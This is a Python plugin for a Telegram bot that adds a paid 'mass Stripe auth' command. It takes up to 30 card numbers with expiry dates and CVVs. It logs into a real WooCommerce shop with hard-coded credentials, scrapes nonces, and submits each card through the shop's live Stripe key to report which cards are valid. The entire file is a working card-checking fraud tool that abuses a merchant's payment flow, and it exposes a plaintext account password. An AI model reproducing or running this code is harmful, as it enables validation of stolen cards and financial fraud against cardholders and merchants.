import time
import re
import requests
import random
import string
from EQUROBOT import app
from config import OWNER_ID
from pyrogram.enums import ParseMode
from EQUROBOT.core.mongo import has_premium_access
from pyrogram import filters
from fake_useragent import UserAgent
from requests.exceptions import RequestException
import asyncio

def random_string(length=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

async def check_card(card_info, message):
    session = requests.Session()  
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return f"Invalid card details for `{card_info}`. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    try:
        user_agent = UserAgent().random
    except Exception:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    headers = {
        "User-Agent": user_agent,
        "Pragma": "no-cache",
        "Accept": "*/*",
    }

    email = random_string() + "@gmail.com"
    results = []

    try:
        response = session.get("https://handtoolessentials.com/my-account/payment-methods/", headers=headers, timeout=10)
        response.raise_for_status()
        n_start = response.text.index('woocommerce-login-nonce" value="') + len('woocommerce-login-nonce" value="')
        n_end = response.text.index('"', n_start)
        nonce = response.text[n_start:n_end]
    except (ValueError, RequestException) as e:
        return f"Failed to extract login nonce or request failed: {str(e)}"

    login_data = {
        'username': "charlotte999251",
        'password': "RAJNISHAYUSHI*1+",
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method',
        'login': 'Log in',
    }

    try:
        response = session.post("https://handtoolessentials.com/my-account/payment-methods/", headers=headers, data=login_data, timeout=10)
        response.raise_for_status()
    except RequestException as e:
        return f"Login failed: {str(e)}"

    try:
        m_start = response.text.index('add_card_nonce":"') + len('add_card_nonce":"')
        m_end = response.text.index('","', m_start)
        add_card_nonce = response.text[m_start:m_end]
    except ValueError:
        return "Failed to extract add card nonce."

    stripe_data = {
        "type": "card",
        "billing_details[name]": "",
        "billing_details[email]": email,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": random_string(32),
        "muid": random_string(32),
        "sid": random_string(32),
        "payment_user_agent": "stripe.js/2F0f84b1fa113B; stripe-js-v3/2F0f84b1fa113B; split-card-element",
        "referrer": "https://handtoolessentials.com",
        "time_on_page": str(random.randint(10000, 50000)),
        "key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
    }

    try:
        stripe_response = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=stripe_data, timeout=10)
        stripe_response.raise_for_status()
        stripe_json = stripe_response.json()
    except (RequestException, ValueError) as e:
        return f"Stripe payment method creation failed: {str(e)}"

    if 'id' not in stripe_json:
        return f"Failed to create payment method. Reason: {stripe_json.get('error', {}).get('message', 'Unknown error')}"

    stripe_id = stripe_json['id']
    print('Payment ID Creation ✅', stripe_id)

    confirm_data = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
        'stripe_source_id': stripe_id,
        'nonce': add_card_nonce,
    }

    try:
        confirm_response = session.post(
            "https://handtoolessentials.com/?wc-ajax=wc_stripe_create_setup_intent",
            headers=headers,
            data=confirm_data,
            timeout=10
        )
        confirm_response.raise_for_status()
        confirm_json = confirm_response.json()

        if 'error' in confirm_json:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp = confirm_json["error"]["message"]

        elif confirm_json.get('status') == 'success':
            status = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅"
            resp = "Approved"

        elif confirm_json.get('status') == 'requires_action':
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp = "Requires OTP."

        else:
            status = "Unknown"
            resp = "No valid response received."

        results.append(
            f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"
        )

        return "\n".join(results)

    except (requests.RequestException, ValueError) as e:
        return "An error occurred during payment confirmation."

@app.on_message(filters.command("msa", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    
    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    card_info_text = None

    if message.reply_to_message:
        card_matches = re.findall(card_pattern, message.reply_to_message.text)
        if card_matches:

            card_info_text = "\n".join(["|".join(match) for match in card_matches])
    else:
        try:
            card_info_text = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            await message.reply(
                "Please provide multiple card details, each on a new line in the format: `card_number|mm|yy|cvv`"
            )
            return

    if not card_info_text:
        await message.reply("No valid card details found. Please provide valid card details.")
        return

    cards_info = card_info_text.split("\n")[:30]
    if len(cards_info) > 30:
        await message.reply("The maximum number of cards allowed is 30. Please reduce the number of cards and try again.")
        return

    for card_info in cards_info:
        if not card_pattern.fullmatch(card_info.strip()):
            await message.reply(
                f"Invalid card format for `{card_info.strip()}`. Please use the correct format: `card_number|mm|yy|cvv`."
            )
            return

    start_time = time.time()
    processing_msg = await message.reply("Processing your mass auth request...")

    results = []

    tasks = [check_card(card_info.strip(), message) for card_info in cards_info]
    results = await asyncio.gather(*tasks)

    elapsed_time = round(time.time() - start_time, 2)

    final_response = "\n".join(results)


    await processing_msg.edit_text(
        text=f"𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n\n{final_response}\n"
        f"𝗧𝗶𝗺𝗲: {elapsed_time} seconds\n"
        f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={user_id})\n"
    )
